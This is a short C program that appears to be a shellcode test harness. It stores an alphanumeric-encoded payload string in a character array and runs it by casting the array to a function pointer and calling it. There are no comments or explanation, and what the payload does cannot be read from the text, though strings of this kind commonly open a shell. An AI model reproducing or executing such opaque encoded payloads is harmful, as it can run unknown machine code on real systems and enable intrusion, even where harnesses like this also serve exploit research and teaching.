#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char shellcode[4000] ="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103w0y4K7L0X0R2p0Z0d0D2D0x4Y3K0Z0a084y5M1P030x8M3D2N2k7p7k1l03";
int main(void)
{
 
    (*(void (*)()) shellcode)();
     
    return 0;
}
